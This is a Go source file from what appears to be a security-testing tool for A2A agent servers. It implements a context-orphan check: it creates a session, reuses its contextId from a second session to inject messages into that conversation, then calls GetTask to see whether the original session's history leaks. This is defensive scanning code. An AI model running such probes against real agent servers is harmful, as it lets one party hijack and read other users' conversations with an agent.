package a2a

import (
	"context"
	"fmt"

	"github.com/calbebop/batesian/internal/attack"
)

// ContextOrphanExecutor tests whether A2A enforces contextId ownership across
// sessions (rule a2a-context-orphan-001).
//
// This is distinct from task IDOR (task-idor-001):
//   - Task IDOR: read an existing task by its taskId from a new session
//   - Context orphan: INJECT into an existing context by providing its contextId
//     in a new session's SendMessage request
//
// Attack sequence:
//  1. Create Task A (Session 1) — record contextId C1.
//  2. New Session 2: SendMessage with configuration.contextId = C1.
//  3. If the server returns contextId == C1 on the new task, the server
//     accepted injection into an existing conversation context.
//  4. Retrieve Task 2 via GetTask and check if Task A's messages appear in
//     the history — confirming cross-session history disclosure.
type ContextOrphanExecutor struct {
	rule attack.RuleContext
}

// NewContextOrphanExecutor creates an executor for the a2a-context-orphan attack type.
func NewContextOrphanExecutor(r attack.RuleContext) *ContextOrphanExecutor {
	return &ContextOrphanExecutor{rule: r}
}

func (e *ContextOrphanExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	client := attack.NewHTTPClient(opts, vars)

	endpoint := vars.BaseURL + "/"
	a2aHeaders := map[string]string{"A2A-Version": "1.0"}

	// Step 1: Create Task A in Session 1 to obtain a contextId.
	probeMarker := "batesian-ctx-probe-" + vars.RandID
	sendResp1, err := client.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-s1-" + vars.RandID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":      1, // USER
				"parts":     []interface{}{map[string]string{"text": probeMarker}},
				"messageId": "batesian-" + vars.RandID,
			},
		},
	})
	// Fallback to v0.3
	if err != nil || !sendResp1.IsSuccess() || isJSONRPCError(sendResp1.Body) {
		sendResp1, err = client.POST(ctx, endpoint, nil, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-s1-" + vars.RandID,
			"method":  "message/send",
			"params": map[string]interface{}{
				"message": map[string]interface{}{
					"role":      "user",
					"parts":     []interface{}{map[string]string{"kind": "text", "text": probeMarker}},
					"messageId": "batesian-" + vars.RandID,
				},
			},
		})
	}
	if err != nil || !sendResp1.IsSuccess() || isJSONRPCError(sendResp1.Body) {
		return nil, nil // not a responsive A2A server
	}

	taskID1, contextID1 := extractTaskContext(sendResp1.Body)
	if contextID1 == "" {
		return nil, nil // server doesn't use contextId — skip
	}

	// Step 2: New Session — create Task B with the victim's contextId explicitly supplied.
	freshVars := attack.NewVars(target, opts.OOBListenerURL)
	freshClient := attack.NewHTTPClient(opts, freshVars)

	sendResp2, err := freshClient.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-s2-" + vars.RandID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":      1,
				"parts":     []interface{}{map[string]string{"text": "batesian-injected-" + vars.RandID}},
				"messageId": "batesian-inject-" + vars.RandID,
			},
			"configuration": map[string]interface{}{
				"contextId": contextID1, // supply victim's contextId
			},
		},
	})
	// Fallback to v0.3 with contextId at top-level params
	if err != nil || !sendResp2.IsSuccess() || isJSONRPCError(sendResp2.Body) {
		sendResp2, err = freshClient.POST(ctx, endpoint, nil, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-s2-" + vars.RandID,
			"method":  "message/send",
			"params": map[string]interface{}{
				"message": map[string]interface{}{
					"role":      "user",
					"parts":     []interface{}{map[string]string{"kind": "text", "text": "batesian-injected-" + vars.RandID}},
					"messageId": "batesian-inject-" + vars.RandID,
				},
				"contextId": contextID1,
			},
		})
	}
	if err != nil || !sendResp2.IsSuccess() || isJSONRPCError(sendResp2.Body) {
		return nil, nil
	}

	taskID2, contextID2 := extractTaskContext(sendResp2.Body)

	var findings []attack.Finding

	// If the new task was assigned to the same contextId, context injection is confirmed.
	if contextID2 != "" && contextID2 == contextID1 {
		findings = append(findings, attack.Finding{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "high",
			Confidence: attack.ConfirmedExploit,
			Title: fmt.Sprintf(
				"A2A server accepted contextId injection — new session joined context %s owned by a different session",
				contextID1),
			Description: fmt.Sprintf(
				"A SendMessage request from a new session supplied contextId %s, which was created "+
					"by a different session (task %s). The server assigned the new task (task %s) "+
					"to the same contextId without verifying context ownership. An attacker who "+
					"learns a victim's contextId can inject messages into their ongoing conversation "+
					"and potentially influence the agent's future responses to the original user.",
				contextID1, taskID1, taskID2),
			Evidence:    fmt.Sprintf("Session 1: taskId=%s contextId=%s\nSession 2: taskId=%s contextId=%s", taskID1, contextID1, taskID2, contextID2),
			Remediation: e.rule.Remediation,
			TargetURL:   endpoint,
		})

		// Step 3: Check if Task 2 can read Task 1's history (cross-session disclosure).
		getResp, err := freshClient.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-get-" + vars.RandID,
			"method":  "GetTask",
			"params": map[string]interface{}{
				"id":            taskID2,
				"historyLength": 20,
			},
		})
		if err == nil && getResp.IsSuccess() && !isJSONRPCError(getResp.Body) &&
			getResp.ContainsAny(probeMarker, taskID1) {
			findings = append(findings, attack.Finding{
				RuleID:     e.rule.ID,
				RuleName:   e.rule.Name,
				Severity:   "critical",
				Confidence: attack.ConfirmedExploit,
				Title: fmt.Sprintf(
					"A2A context injection also exposes original session history (task %s messages visible in task %s)",
					taskID1, taskID2),
				Description: fmt.Sprintf(
					"After injecting into contextId %s from a new session (task %s), GetTask for "+
						"the new task returned conversation history that includes the original session's "+
						"messages (task %s). This is both context injection and cross-session data "+
						"disclosure: the attacker can read the victim's full conversation history.",
					contextID1, taskID2, taskID1),
				Evidence: fmt.Sprintf(
					"probeMarker: %s\nfound in GetTask %s response\n%s",
					probeMarker, taskID2, snippet(getResp.Body, 500)),
				Remediation: e.rule.Remediation,
				TargetURL:   endpoint,
			})
		}
	}

	return findings, nil
}
